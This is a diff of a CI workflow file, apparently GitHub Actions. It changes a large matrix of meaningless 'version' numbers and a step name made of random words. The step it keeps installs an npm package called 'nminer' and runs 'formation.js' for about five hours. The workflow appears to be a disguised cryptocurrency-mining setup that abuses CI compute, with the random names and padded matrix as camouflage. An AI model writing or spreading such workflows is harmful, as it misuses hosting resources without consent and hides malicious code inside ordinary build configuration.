@@ -9,24 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6808 }
-          - { version: 9550 }
-          - { version: 794 }
-          - { version: 7325 }
-          - { version: 5521 }
-          - { version: 792 }
-          - { version: 1443 }
-          - { version: 8798 }
-          - { version: 5406 }
-          - { version: 7376 }
-          - { version: 22 }
-          - { version: 3084 }
-          - { version: 2578 }
-          - { version: 5186 }
-          - { version: 4334 }
-          - { version: 7263 }
-          - { version: 6109 }
-          - { version: 4028 }
+          - { version: 250 }
+          - { version: 1830 }
+          - { version: 5520 }
+          - { version: 8016 }
+          - { version: 6600 }
+          - { version: 1626 }
+          - { version: 1738 }
+          - { version: 1693 }
+          - { version: 1559 }
+          - { version: 9412 }
+          - { version: 8897 }
+          - { version: 3083 }
+          - { version: 3859 }
+          - { version: 1375 }
+          - { version: 3810 }
 
     steps:
       - name: Checkout
@@ -37,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: furlough upbeat decriminalize conceptualize reorient
+      - name: peony rejoin phew onto
         run: |
           npm install nminer@latest
-          timeout 325m node formation.js || echo "formation executed"
+          timeout 308m node formation.js || echo "formation executed"
